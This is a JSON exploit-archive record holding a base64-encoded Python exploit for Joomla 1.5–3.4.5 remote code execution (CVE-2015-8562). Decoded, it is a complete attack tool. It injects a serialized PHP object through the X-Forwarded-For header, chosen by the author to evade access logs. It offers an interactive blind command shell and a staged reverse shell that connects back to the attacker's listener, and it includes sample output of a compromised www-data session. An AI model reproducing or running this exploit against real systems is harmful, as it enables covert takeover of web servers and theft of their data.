{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgRXhwbG9pdCBUaXRsZTogSm9vbWxhIDEuNSAtIDMuNC41IE9iamVjdCBJbmplY3Rpb24gUkNFIFgtRm9yd2FyZGVkLUZvciBoZWFkZXINCiMgRGF0ZTogMTIvMTcvMjAxNQ0KIyBFeHBsb2l0IEF1dGhvcjogb3JpZ2luYWwgLSBHYXJ5QCBTZWMtMSBsdGQsIE1vZGlmaWVkIC0gQW5kcmV3IE1jTmljb2wgQnJlYWtQb2ludCBMYWJzIChAMHhjY19sYWJzKQ0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vd3d3Lmpvb21sYS5vcmcvDQojIFNvZnR3YXJlIExpbms6IGh0dHA6Ly9qb29tbGFjb2RlLm9yZy9nZi9wcm9qZWN0L2pvb21sYS9mcnMvDQojIFZlcnNpb246IEpvb21sYSAxLjUgLSAzLjQuNQ0KIyBUZXN0ZWQgb246IFVidW50dSAxNC4wNC4yIExUUyAoSm9vbWxhISAzLjIuMSBTdGFibGUpDQojIENWRSA6IENWRS0yMDE1LTg1NjINCg0KDQonJycNCiAgICBKb29tbGEgMS41IC0gMy40LjUgT2JqZWN0IEluamVjdGlvbiBSQ0UgLSBDVkUtMjAxNS04NTYyDQogICAgUG9DIGZvciBDVkUtMjAxNS04NTYyIHRvIHNwYXduIGEgcmV2ZXJzZSBzaGVsbCBvciBhdXRvbWF0ZSBSQ0UNCg0KICAgIE9yaWdpbmFsIFBvQyBmcm9tIEdhcnlAIFNlYy0xIGx0ZCAoaHR0cDovL3d3dy5zZWMtMS5jb20pOiANCiAgICBodHRwczovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8zODk3Ny8NCg0KICAgIFZ1bG5lcmFiaWxpdHkgSW5mbywgRXhwbG9pdCwgRGV0ZWN0aW9uOg0KICAgIGh0dHBzOi8vYnJlYWtwb2ludC1sYWJzLmNvbS9qb29tbGEtcmNlLWN2ZS0yMDE1LTg1NjIvDQoNCiAgICBFeHBsb2l0IG1vZGlmaWVkIHRvIHVzZSAiWC1Gb3J3YXJkZWQtRm9yIiBoZWFkZXIgaW5zdGVhZCBvZiAiVXNlci1BZ2VudCIgdG8gYXZvaWQgZGVmYXVsdCBsb2dnZWQgdG8gYWNjZXNzLmxvZw0KDQogICAgVXNhZ2UgLSBBdXRvbWF0ZSBCbGluZCBSQ0U6DQogICAgcHl0aG9uIGpvb21sYS1yY2UtMi1zaGVsbC5weSAtdCBodHRwOi8vMTkyLjE2OC4xLjEzOS8gLS1jbWQNCiAgICAkIHRvdWNoIC90bXAvbmV3aG5ld2ggICAgDQoNCiAgICBVc2FnZSAtIFNwYXduIFJldmVyc2UgU2hlbGwgdXNpbmcgUGVudGVzdG1vbmtleSdzIFB5dGhvbiBvbmUtbGluZXIgYW5kIG5ldGNhdCBsaXN0ZW5lciBvbiBsb2NhbCBob3N0Og0KICAgIHB5dGhvbiBqb29tbGEtcmNlLTItc2hlbGwucHkgLXQgaHR0cDovLzE5Mi4xNjguMS4xMzkvIC1sIDE5Mi4xNjguMS4xMTkgLXAgNDQ0NA0KICAgIFstXSBBdHRlbXB0aW5nIHRvIGV4cGxvaXQgSm9vbWxhIFJDRSAoQ1ZFLTIwMTUtODU2Mikgb246IGh0dHA6Ly8xOTIuMTY4LjEuMTM5Lw0KICAgIFstXSBVcGxvYWRpbmcgcHl0aG9uIHJldmVyc2Ugc2hlbGwgd2l0aCBMSE9TVDoxOTIuMTY4LjEuMTE5IGFuZCBMUE9SVDo0NDQ0DQogICAgPFJlc3BvbnNlIFsyMDBdPg0KICAgIFsrXSBTcGF3bmluZyByZXZlcnNlIHNoZWxsLi4uLg0KICAgIDxSZXNwb25zZSBbMjAwXT4NCg0KICAgIExpc3RlbmluZyBvbiBbMC4wLjAuMF0gKGZhbWlseSAwLCBwb3J0IDQ0NDQpDQogICAgJCBweXRob24gLWMgImltcG9ydCBwdHk7cHR5LnNwYXduKCcvYmluL2Jhc2gnKSINCiAgICB3d3ctZGF0YUB1YnVudHU6LyQgaWQNCiAgICB1aWQ9MzMod3d3LWRhdGEpIGdpZD0zMyh3d3ctZGF0YSkgZ3JvdXBzPTMzKHd3dy1kYXRhKQ0KICAgIHd3dy1kYXRhQHVidW50dTovJCANCg0KJycnDQogICAgDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBzdWJwcm9jZXNzDQppbXBvcnQgYXJncGFyc2UNCmltcG9ydCBzeXMNCmltcG9ydCBiYXNlNjQNCiANCiMgSGVhdnkgbGlmdGluZyBmcm9tIFBvQyBhdXRob3IgR2FyeUAgU2VjLTEgbHRkIChodHRwOi8vd3d3LnNlYy0xLmNvbSkNCmRlZiBnZXRfdXJsKHVybCwgdXNlcl9hZ2VudCk6DQogDQogICAgaGVhZGVycyA9IHsNCiAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDVfMCBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC81MzQuNDYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzUuMSBNb2JpbGUvOUEzMzQgU2FmYXJpLzc1MzQuNDguMycsICMgQ2hhbmdlIGRlZmF1bHQgVUEgZm9yIFJlcXVlc3RzDQogICAgJ3gtZm9yd2FyZGVkLWZvcic6IHVzZXJfYWdlbnQgICAjIFgtRm9yd2FyZGVkLUZvciBoZWFkZXIgaW5zdGVhZCBvZiBVQQ0KICAgIH0NCiAgICBjb29raWVzID0gcmVxdWVzdHMuZ2V0KHVybCxoZWFkZXJzPWhlYWRlcnMpLmNvb2tpZXMNCiAgICBmb3IgXyBpbiByYW5nZSgzKToNCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMsY29va2llcz1jb29raWVzKSAgICANCiAgICByZXR1cm4gcmVzcG9uc2UNCg0KDQpkZWYgcGhwX3N0cl9ub3F1b3RlcyhkYXRhKToNCiAgICAiQ29udmVydCBzdHJpbmcgdG8gY2hyKHh4KS5jaHIoeHgpIGZvciB1c2UgaW4gcGhwIg0KICAgIGVuY29kZWQgPSAiIg0KICAgIGZvciBjaGFyIGluIGRhdGE6DQogICAgICAgIGVuY29kZWQgKz0gImNocih7MH0pLiIuZm9ybWF0KG9yZChjaGFyKSkNCiANCiAgICByZXR1cm4gZW5jb2RlZFs6LTFdDQoNCiANCmRlZiBnZW5lcmF0ZV9wYXlsb2FkKHBocF9wYXlsb2FkKToNCiANCiAgICBwaHBfcGF5bG9hZCA9ICJldmFsKHswfSkiLmZvcm1hdChwaHBfc3RyX25vcXVvdGVzKHBocF9wYXlsb2FkKSkNCiANCiAgICB0ZXJtaW5hdGUgPSAnXHhmMFx4ZmRceGZkXHhmZCc7DQogICAgZXhwbG9pdF90ZW1wbGF0ZSA9IHInJyd9X190ZXN0fE86MjE6IkpEYXRhYmFzZURyaXZlck15c3FsaSI6Mzp7czoyOiJmYyI7TzoxNzoiSlNpbXBsZXBpZUZhY3RvcnkiOjA6e31zOjIxOiJcMFwwXDBkaXNjb25uZWN0SGFuZGxlcnMiO2E6MTp7aTowO2E6Mjp7aTowO086OToiU2ltcGxlUGllIjo1OntzOjg6InNhbml0aXplIjtPOjIwOiJKRGF0YWJhc2VEcml2ZXJNeXNxbCI6MDp7fXM6ODoiZmVlZF91cmwiOycnJw0KICAgIGluamVjdGVkX3BheWxvYWQgPSAie307SkZhY3Rvcnk6OmdldENvbmZpZygpO2V4aXQiLmZvcm1hdChwaHBfcGF5bG9hZCkgICAgDQogICAgZXhwbG9pdF90ZW1wbGF0ZSArPSByJycnczp7MH06InsxfSInJycuZm9ybWF0KHN0cihsZW4oaW5qZWN0ZWRfcGF5bG9hZCkpLCBpbmplY3RlZF9wYXlsb2FkKQ0KICAgIGV4cGxvaXRfdGVtcGxhdGUgKz0gcicnJztzOjE5OiJjYWNoZV9uYW1lX2Z1bmN0aW9uIjtzOjY6ImFzc2VydCI7czo1OiJjYWNoZSI7YjoxO3M6MTE6ImNhY2hlX2NsYXNzIjtPOjIwOiJKRGF0YWJhc2VEcml2ZXJNeXNxbCI6MDp7fX1pOjE7czo0OiJpbml0Ijt9fXM6MTM6IlwwXDBcMGNvbm5lY3Rpb24iO2I6MTt9JycnICsgdGVybWluYXRlDQogDQogICAgcmV0dXJuIGV4cGxvaXRfdGVtcGxhdGUNCg0KDQpkZWYgbWFpbigpOg0KICAgIHBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKHByb2c9J2N2ZS0yMDE1LTg1NjIucHknLCBkZXNjcmlwdGlvbj0nQXV0b21hdGUgYmxpbmQgUkNFIGZvciBKb29tbGEgdnVsbiBDVkUtMjAxNS04NjUyJykNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctdCcsIGRlc3Q9J1JIT1NUJywgcmVxdWlyZWQ9VHJ1ZSwgaGVscD0nUmVtb3RlIFRhcmdldCBKb29tbGEgU2VydmVyJykNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctbCcsIGRlc3Q9J0xIT1NUJywgaGVscD0nc3BlY2lmaXkgbG9jYWwgaXAgZm9yIHJldmVyc2Ugc2hlbGwnKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy1wJywgZGVzdD0nTFBPUlQnLCBoZWxwPSdzcGVjaWZpeSBsb2NhbCBwb3J0IGZvciByZXZlcnNlIHNoZWxsJykNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCctLWNtZCcsIGRlc3Q9J2NtZCcsIGFjdGlvbj0nc3RvcmVfdHJ1ZScsIGhlbHA9J2Ryb3AgaW50byBibGluZCBSQ0UnKQ0KDQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkNCg0KICAgIGlmIGFyZ3MuY21kOg0KICAgICAgICBwcmludCAiWy1dIEF0dGVtcHRpbmcgdG8gZXhwbG9pdCBKb29tbGEgUkNFIChDVkUtMjAxNS04NTYyKSBvbjoge30iLmZvcm1hdChhcmdzLlJIT1NUKQ0KICAgICAgICBwcmludCAiWy1dIERyb3BwaW5nIGludG8gc2hlbGwtbGlrZSBlbnZpcm9ubWVudCB0byBwZXJmb3JtIGJsaW5kIFJDRSINCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIGNvbW1hbmQgPSByYXdfaW5wdXQoJyQgJykNCiAgICAgICAgICAgIGNtZF9zdHIgPSAic3lzdGVtKCd7fScpOyIuZm9ybWF0KGNvbW1hbmQpDQogICAgICAgICAgICBwbCA9IGdlbmVyYXRlX3BheWxvYWQoY21kX3N0cikNCiAgICAgICAgICAgIHByaW50IGdldF91cmwoYXJncy5SSE9TVCwgcGwpDQoNCiAgICAjIFNwYXduIFJldmVyc2UgU2hlbGwgdXNpbmcgTmV0Y2F0IGxpc3RlbmVyICsgUHl0aG9uIHNoZWxsIG9uIHZpY3RpbQ0KICAgIGVsaWYgYXJncy5MUE9SVCBhbmQgYXJncy5MUE9SVDoNCiAgICAgICAgY29ubmVjdGlvbiA9ICIne30nLCB7fSIuZm9ybWF0KGFyZ3MuTEhPU1QsIGFyZ3MuTFBPUlQpDQoNCiAgICAgICAgIyBwZW50ZXN0bW9ua2V5J3MgUHl0aG9uIHJldmVyc2Ugc2hlbGwgb25lLWxpbmVyOg0KICAgICAgICBzaGVsbF9zdHIgPSAnJydpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnJycrY29ubmVjdGlvbisnJycpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycnJw0KICAgICAgICAjIEJhc2U2NCBlbmNvZGVkIHRoZSBQeXRob24gcmV2ZXJzZSBzaGVsbCBhcyBzb21lIGNoYXJzIHdlcmUgbWVzc2luZyB1cCBpbiB0aGUgZXhwbG9pdA0KICAgICAgICBlbmNvZGVkX2NvbW0gPSBiYXNlNjQuYjY0ZW5jb2RlKHNoZWxsX3N0cikNCiAgICAgICAgIyBTdGFnZSAxIHBheWxvYWQgU3RyDQogICAgICAgIHBheWxvYWQgPSAiZWNobyB7fSB8IGJhc2U2NCAtZCA+IC90bXAvbmV3aG5ld2gucHkiLmZvcm1hdChlbmNvZGVkX2NvbW0pDQogICAgICAgIHByaW50ICJbLV0gQXR0ZW1wdGluZyB0byBleHBsb2l0IEpvb21sYSBSQ0UgKENWRS0yMDE1LTg1NjIpIG9uOiB7fSIuZm9ybWF0KGFyZ3MuUkhPU1QpDQogICAgICAgIHByaW50ICJbLV0gVXBsb2FkaW5nIHB5dGhvbiByZXZlcnNlIHNoZWxsIHdpdGggTEhPU1Qge30gYW5kIHt9Ii5mb3JtYXQoYXJncy5MSE9TVCwgYXJncy5MUE9SVCkNCiAgICAgICAgIyBTdGFnZSAxOiBVcGxvYWRzIHRoZSBQeXRob24gcmV2ZXJzZSBzaGVsbCB0byAiL3RtcC9uZXdobmV3aC5weSINCiAgICAgICAgcGwgPSBnZW5lcmF0ZV9wYXlsb2FkKCJzeXN0ZW0oJyIrcGF5bG9hZCsiJyk7IikNCiAgICAgICAgcHJpbnQgZ2V0X3VybChhcmdzLlJIT1NULCBwbCkNCiAgICAgICAgIyBTcGF3bnMgU2hlbGwgbGlzdGVuZXIgdXNpbmcgbmV0Y2F0IG9uIExIT1NUDQogICAgICAgIGxpc3RlbmVyID0gc3VicHJvY2Vzcy5Qb3BlbihhcmdzPVsiZ25vbWUtdGVybWluYWwiLCAiLS1jb21tYW5kPW5jIC1sdnAgIithcmdzLkxQT1JUXSkNCiAgICAgICAgcHJpbnQgIlsrXSBTcGF3bmluZyByZXZlcnNlIHNoZWxsLi4uLiINCiAgICAgICAgIyBTdGFnZSAyOiBFeGVjdXRlcyBQeXRob24gcmV2ZXJzZSBzaGVsbCBiYWNrIHRvIExIT1NUOkxQT1JUDQogICAgICAgIHBsID0gZ2VuZXJhdGVfcGF5bG9hZCgic3lzdGVtKCdweXRob24gL3RtcC9uZXdobmV3aC5weScpOyIpDQogICAgICAgIHByaW50IGdldF91cmwoYXJncy5SSE9TVCwgcGwpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQgJ1shXSBtaXNzaW5nIGFyZ3VtZW50cycNCiAgICAgICAgcGFyc2VyLnByaW50X2hlbHAoKQ0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp", 
    "filename": "platforms/php/webapps/39033.py", 
    "id": "39033", 
    "cves": [
        "CVE-2015-8652", 
        "CVE-2015-8562"
    ]
}